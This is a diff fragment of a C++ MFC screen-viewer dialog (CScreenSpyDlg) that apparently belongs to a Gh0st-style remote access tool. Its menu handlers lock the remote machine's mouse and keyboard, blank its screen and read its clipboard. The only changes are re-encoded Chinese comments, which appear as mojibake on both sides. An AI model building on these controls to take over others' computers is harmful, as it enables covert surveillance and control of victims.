 			OnSize(0, rectClient.right, rectClient.bottom);
 			return;
@@ -835,28 +835,28 @@ void CScreenSpyDlg::OnNcLButtonDblClk(UINT nHitTest, CPoint point)
 		int nMinX, nMinY, nMaxWindowWidth, nMaxWindowHeight;
 		UINT_PTR uState = SHAppBarMessage(ABM_GETSTATE, &abd);
 		SHAppBarMessage(ABM_GETTASKBARPOS, &abd);
-		if (abd.uEdge == 0) // ä»»åŠ¡æ åœ¨å·¦
+		if (abd.uEdge == 0) // ÈÎÎñÀ¸ÔÚ×ó
 		{
 			nMinX = uState == ABS_AUTOHIDE ? 0 : abd.rc.right;
 			nMinY = 0;
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
 		}
-		if (abd.uEdge == 1) // ä»»åŠ¡æ åœ¨ä¸Š
+		if (abd.uEdge == 1) // ÈÎÎñÀ¸ÔÚÉÏ
 		{
 			nMinX = 0;
 			nMinY = uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom;
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom);
 		}
-		if (abd.uEdge == 2) // ä»»åŠ¡æ åœ¨å³
+		if (abd.uEdge == 2) // ÈÎÎñÀ¸ÔÚÓÒ
 		{
 			nMinX = 0;
 			nMinY = 0;
 			nMaxWindowWidth = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right - abd.rc.left);
 			nMaxWindowHeight = GetSystemMetrics(SM_CYSCREEN);
 		}
-		if (abd.uEdge == 3) // ä»»åŠ¡æ åœ¨ä¸‹
+		if (abd.uEdge == 3) // ÈÎÎñÀ¸ÔÚÏÂ
 		{
 			nMinX = 0;
 			nMinY = 0;
@@ -868,8 +868,8 @@ void CScreenSpyDlg::OnNcLButtonDblClk(UINT nHitTest, CPoint point)
 		GetClientRect(&rectClient);
 		ClientToScreen(&rectClient);
 		
-		int	nBorderSize = rectClient.left - m_rcRestore.left; // å•è¾¹æ¡†çš„å¤§å°(å®½åº¦æˆ–é«˜åº¦)
-		int	nTitleHeight = rectClient.top - m_rcRestore.top - nBorderSize; // æ ‡é¢˜æ çš„é«˜åº¦
+		int	nBorderSize = rectClient.left - m_rcRestore.left; // µ¥±ß¿òµÄ´óĞ¡(¿í¶È»ò¸ß¶È)
+		int	nTitleHeight = rectClient.top - m_rcRestore.top - nBorderSize; // ±êÌâÀ¸µÄ¸ß¶È
 		int nMaxClientWidth = nMaxWindowWidth - nBorderSize * 2;
 		int nMaxClientHeight = nMaxWindowHeight - nTitleHeight - nBorderSize * 2;
 		
@@ -913,7 +913,7 @@ void CScreenSpyDlg::OnNcLButtonDblClk(UINT nHitTest, CPoint point)
 			int nMovWindowHeight = nMaxWindowHeight;
 			MoveWindow(nMinX, nMinY, nMovWindowWidth, nMovWindowHeight);
 		}
-		// å¿…é¡»OnSizeä¸€æ¬¡, å¦åˆ™æ»šåŠ¨æ¡æ˜¾ç¤ºæœ‰ç‚¹é—®é¢˜
+		// ±ØĞëOnSizeÒ»´Î, ·ñÔò¹ö¶¯ÌõÏÔÊ¾ÓĞµãÎÊÌâ
 		GetClientRect(&rectClient);
 		OnSize(0, rectClient.right, rectClient.bottom);
 		return;
@@ -928,9 +928,9 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	case SC_MAXIMIZE:
 		OnNcLButtonDblClk(HTCAPTION, NULL);
 		return;
-	case SC_MONITORPOWER: // æ‹¦æˆªæ˜¾ç¤ºå™¨èŠ‚ç”µè‡ªåŠ¨å…³é—­çš„æ¶ˆæ¯
+	case SC_MONITORPOWER: // À¹½ØÏÔÊ¾Æ÷½Úµç×Ô¶¯¹Ø±ÕµÄÏûÏ¢
 		return;
-	case SC_SCREENSAVE:   // æ‹¦æˆªå±å¹•ä¿æŠ¤å¯åŠ¨çš„æ¶ˆæ¯
+	case SC_SCREENSAVE:   // À¹½ØÆÁÄ»±£»¤Æô¶¯µÄÏûÏ¢
 		return;
 	case IDM_CONTROL:
 		{
@@ -964,7 +964,7 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 		}
 		break;
-	case IDM_TRACE_CURSOR:   // è·Ÿè¸ªæœåŠ¡ç«¯é¼ æ ‡
+	case IDM_TRACE_CURSOR:   // ¸ú×Ù·şÎñ¶ËÊó±ê
 		{
 			m_bIsTraceCursor = !m_bIsTraceCursor;	
 			pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
@@ -975,11 +975,11 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 				else
 					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
 			}
-			// é‡ç»˜æ¶ˆé™¤æˆ–æ˜¾ç¤ºé¼ æ ‡
+			// ÖØ»æÏû³ı»òÏÔÊ¾Êó±ê
 			OnPaint();
 		}
 		break;
-	case IDM_BLOCK_INPUT:    // é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜
+	case IDM_BLOCK_INPUT:    // Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ
 		{
 			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
 			pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -990,7 +990,7 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 		}
 		break;
-	case IDM_BLANK_SCREEN:   // æœåŠ¡ç«¯é»‘å±
+	case IDM_BLANK_SCREEN:   // ·şÎñ¶ËºÚÆÁ
 		{
 			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED;
 			pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -1001,7 +1001,7 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 		}
 		break;
-	case IDM_CAPTURE_LAYER:  // æ•æ‰å±‚
+	case IDM_CAPTURE_LAYER:  // ²¶×½²ã
 		{
 			bool bIsChecked = pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED;
 			pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -1015,30 +1015,30 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	case IDM_SAVEDIB:
 		SaveSnapshot();
 		break;
-	case IDM_GET_CLIPBOARD:  // è·å–å‰ªè´´æ¿
+	case IDM_GET_CLIPBOARD:  // »ñÈ¡¼ôÌù°å
 		{
 			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
 			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 		}
 		break;
-	case IDM_SET_CLIPBOARD:  // è®¾ç½®å‰ªè´´æ¿
+	case IDM_SET_CLIPBOARD:  // ÉèÖÃ¼ôÌù°å
 		{
 			SendLocalClipboard();
 		}
 		break;
-	case IDM_AERO_DISABLE:   // ç¦ç”¨æ¡Œé¢åˆæˆ(Aero)
+	case IDM_AERO_DISABLE:   // ½ûÓÃ×ÀÃæºÏ³É(Aero)
 		{
 			BYTE	bToken = COMMAND_AERO_DISABLE;
 			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 		}
 		break;
-	case IDM_AERO_ENABLE:    // å¯ç”¨æ¡Œé¢åˆæˆ(Aero)
+	case IDM_AERO_ENABLE:    // ÆôÓÃ×ÀÃæºÏ³É(Aero)
 		{
 			BYTE	bToken = COMMAND_AERO_ENABLE;
 			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 		}
 		break;
-	case IDM_ALGORITHM_HOME: // å®¶ç”¨åŠå…¬ç®—æ³•
+	case IDM_ALGORITHM_HOME: // ¼ÒÓÃ°ì¹«Ëã·¨
 		{
 			SendResetScreen(32);
 			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_HOME, IDM_ALGORITHM_XVID, IDM_ALGORITHM_HOME, MF_BYCOMMAND);
@@ -1047,7 +1047,7 @@ void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			SendResetAlgorithm(ALGORITHM_HOME);
 		}
 		break;
-	case IDM_ALGORITHM_XVID: // å½±è§†å¨±ä¹ç®—æ³•
+	case IDM_ALGORITHM_XVID: // Ó°ÊÓÓéÀÖËã·¨
 		{
 			SendResetAlgorithm(ALGORITHM_XVID);
 			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_HOME, IDM_ALGORITHM_XVID, IDM_ALGORITHM_XVID, MF_BYCOMMAND);
@@ -1108,8 +1108,8 @@ void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
 	GetClientRect(&rectClient);
 	ClientToScreen(&rectClient);
 	
-	int	nBorderSize = rectClient.left - rectWindow.left; // å•è¾¹æ¡†çš„å¤§å°(å®½åº¦æˆ–é«˜åº¦)
-	int	nTitleHeight = rectClient.top - rectWindow.top - nBorderSize; // æ ‡é¢˜æ çš„é«˜åº¦
+	int	nBorderSize = rectClient.left - rectWindow.left; // µ¥±ß¿òµÄ´óĞ¡(¿í¶È»ò¸ß¶È)
+	int	nTitleHeight = rectClient.top - rectWindow.top - nBorderSize; // ±êÌâÀ¸µÄ¸ß¶È
 // 	int nMinWindowWidth = 400 + nBorderSize * 2;
 // 	int nMinWindowHeight = 300 + nTitleHeight + nBorderSize * 2;
 	int nMaxWindowWidth = m_lpbmi_full->bmiHeader.biWidth + nBorderSize * 2;
@@ -1135,28 +1135,28 @@ void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
 // 	abd.cbSize = sizeof(abd);
 // 	UINT_PTR uState = SHAppBarMessage(ABM_GETSTATE, &abd);
 // 	SHAppBarMessage(ABM_GETTASKBARPOS, &abd);
-// 	if (abd.uEdge == 0) // ä»»åŠ¡æ åœ¨å·¦
+// 	if (abd.uEdge == 0) // ÈÎÎñÀ¸ÔÚ×ó
 // 	{
 // 		lpMMI->ptMaxPosition.x = uState == ABS_AUTOHIDE ? 0 : abd.rc.right;
 // 		lpMMI->ptMaxPosition.y = 0;
 // 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right);
 // 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN);
 // 	}
-// 	if (abd.uEdge == 1) // ä»»åŠ¡æ åœ¨ä¸Š
+// 	if (abd.uEdge == 1) // ÈÎÎñÀ¸ÔÚÉÏ
 // 	{
 // 		lpMMI->ptMaxPosition.x = 0;
 // 		lpMMI->ptMaxPosition.y = uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom;
 // 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN);
 // 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.bottom);
 // 	}
-// 	if (abd.uEdge == 2) // ä»»åŠ¡æ åœ¨å³
+// 	if (abd.uEdge == 2) // ÈÎÎñÀ¸ÔÚÓÒ
 // 	{
 // 		lpMMI->ptMaxPosition.x = 0;
 // 		lpMMI->ptMaxPosition.y = 0;
 // 		lpMMI->ptMaxSize.x = GetSystemMetrics(SM_CXSCREEN) - (uState == ABS_AUTOHIDE ? 0 : abd.rc.right - abd.rc.left);
 // 		lpMMI->ptMaxSize.y = GetSystemMetrics(SM_CYSCREEN);
 // 	}
-// 	if (abd.uEdge == 3) // ä»»åŠ¡æ åœ¨ä¸‹
+// 	if (abd.uEdge == 3) // ÈÎÎñÀ¸ÔÚÏÂ
 // 	{
 // 		lpMMI->ptMaxPosition.x = 0;
 // 		lpMMI->ptMaxPosition.y = 0;
@@ -1189,7 +1189,7 @@ BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 	switch (pMsg->message)
 	{
 	case WM_MOUSEMOVE:
-		if (GetKeyState(VK_SCROLL) & 0x0001) // Scrollç¯ç‚¹äº®çŠ¶æ€
+		if (GetKeyState(VK_SCROLL) & 0x0001) // ScrollµÆµãÁÁ×´Ì¬
 		{
 			CRect ClientRect;
 			GetClientRect(ClientRect);
@@ -1477,7 +1477,7 @@ LRESULT CScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
 	// TODO: Add your specialized code here and/or call the base class
 	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
 	{
-		return BROADCAST_QUERY_DENY; // æ‹¦æˆªç³»ç»Ÿå¾…æœº, ä¼‘çœ çš„è¯·æ±‚
+		return BROADCAST_QUERY_DENY; // À¹½ØÏµÍ³´ı»ú, ĞİÃßµÄÇëÇó
 	}
 	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam) && m_bIsFullScreen)
 	{
